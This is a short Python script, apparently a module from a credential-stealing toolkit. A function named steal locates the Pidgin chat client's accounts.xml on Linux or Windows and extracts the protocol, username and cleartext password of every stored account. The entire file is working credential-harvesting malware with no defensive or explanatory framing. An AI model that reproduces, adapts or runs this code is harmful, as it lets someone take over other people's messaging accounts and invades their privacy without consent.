# Standard imports
import platform
import os
import xml.etree.ElementTree as xml

def steal():
	if platform.system() == "Linux":
		# Set the path for Linux
		path = os.getenv("HOME") + "/.purple/accounts.xml"
	elif platform.system() == "Windows":
		# Set the path for Windows
		path = os.getenv("APPDATA") + "\\.purple\\accounts.xml"
	else:
		# Mac isn't supported now
		return ("[-] Mac OSX is not supported")
	# Call the function
	return _steal_(path)
# Cross-platform steal method
def _steal_(path):
	ret = list()
	try:
		# Parse the XML
		root = xml.parse(path).getroot()
	except:
		# Uh,oh file not found
		return ("[-] accounts.xml not found")
	# Enumerate the accounts where password is present	
	for acc in root:
		# Check for password presence
		if acc[2].tag == "password":
			# The good/bad thing about Pidgin is that by default it stores cleartext passwords
			ret.append("[+] Protocol:{proto}\n    Username:{us}\n    Password:{pw}\n".format(us=acc[1].text,pw=acc[2].text,proto=acc[0].text.split('prpl-')[1]))
	if len(ret) == 0:
		return ('[-] There are no passwords')
	return ret
